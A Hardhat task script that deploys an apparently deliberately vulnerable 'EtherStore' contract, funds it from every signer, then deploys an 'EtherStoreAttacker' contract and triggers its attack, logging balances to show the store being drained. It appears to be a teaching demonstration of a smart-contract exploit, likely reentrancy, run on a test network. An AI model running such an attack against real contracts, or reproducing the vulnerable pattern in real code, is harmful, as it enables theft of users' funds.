import { task } from "hardhat/config";
import { formatEther, WeiPerEther } from "ethers";

task("eth", "Deploys EtherStore contract").setAction(async (_, hre) => {
  const storeFactory = await hre.ethers.getContractFactory("EtherStore");
  const storeInstance = await storeFactory.deploy();
  await storeInstance.waitForDeployment();

  console.info(`Ether Store deployed to ${storeInstance.target}`);

  const accounts = await hre.ethers.getSigners();

  for (const account of accounts) {
    const tx = await storeInstance.connect(account).deposit({ value: WeiPerEther });
    await tx.wait();
  }

  const balance1 = await hre.ethers.provider.getBalance(storeInstance.target);
  console.info(`Store Balance: ${formatEther(balance1)} ETH`);

  const attackerFactory = await hre.ethers.getContractFactory("EtherStoreAttacker");
  const attackerInstance = await attackerFactory.deploy(storeInstance.target);
  await attackerInstance.waitForDeployment();

  console.info(`Attacker deployed to ${attackerInstance.target}`);

  const tx = await attackerInstance.attack({ value: WeiPerEther });
  await tx.wait();

  const balance2 = await hre.ethers.provider.getBalance(storeInstance.target);
  console.info(`Store Balance: ${formatEther(balance2)} ETH`);

  const balance3 = await hre.ethers.provider.getBalance(attackerInstance.target);
  console.info(`Atacker Balance: ${formatEther(balance3)} ETH`);

  console.info("DONE");
});

// hardhat eth --network ethberry_besu
